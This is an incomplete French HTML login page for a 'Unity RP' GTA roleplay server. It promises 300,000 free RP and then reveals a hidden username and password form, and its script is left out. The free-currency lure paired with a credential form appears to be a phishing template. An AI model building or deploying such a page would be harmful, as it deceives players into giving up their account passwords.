<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Unity RP - Connexion</title>
    <style>
        body { 
            margin: 0; 
            padding: 0; 
            font-family: sans-serif; 
            background: #121212; 
            color: white; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
        }
        /* Style général des cartes */
        .card { 
            background: #1e1e1e; 
            padding: 30px; 
            border-radius: 10px; 
            text-align: center; 
            width: 320px; 
            box-shadow: 0 4px 15px rgba(0,0,0,0.5); 
        }
        .hidden { display: none !important; }
        .btn { 
            background: #5200ee; 
            color: white; 
            border: none; 
            padding: 10px 20px; 
            border-radius: 5px; 
            cursor: pointer; 
            width: 100%; 
            margin-top: 10px; 
        }
        input { 
            width: 100%; 
            padding: 10px; 
            margin: 5px 0; 
            border-radius: 5px; 
            border: 1px solid #333; 
            background: #2b2b2b; 
            color: white; 
            box-sizing: border-box; 
        }
        /* Fond vidéo (GTA) */
        #videoStream { 
            position: fixed; 
            top: 0; left: 0; 
            width: 100%; height: 100%; 
            object-fit: cover; 
            z-index: -1; 
        }
    </style>
</head>
<body>

    <!-- Fond Vidéo -->
    <video id="videoStream" autoplay muted loop playsinline class="hidden"></video>

    <!-- Écran Principal -->
    <div id="mainCard" class="card">
        <h1>Unity RP</h1>
        <p>Récupérer 300 000 RP</p>
        <button id="joinBtn" class="btn">Rejoindre le jeu</button>
    </div>

    <!-- Écran de Connexion (Caché au départ) -->
    <div id="loginCard" class="card hidden">
        <h2>Connexion</h2>
        <input type="text" id="username" placeholder="Nom d'utilisateur">
        <input type="password" id="password" placeholder="Mot de passe">
        <button id="loginBtn" class="btn">Se connecter</button>
    </div>

    <!-- Le JavaScript va ici (voir bloc suivant) -->
</body>
</html>
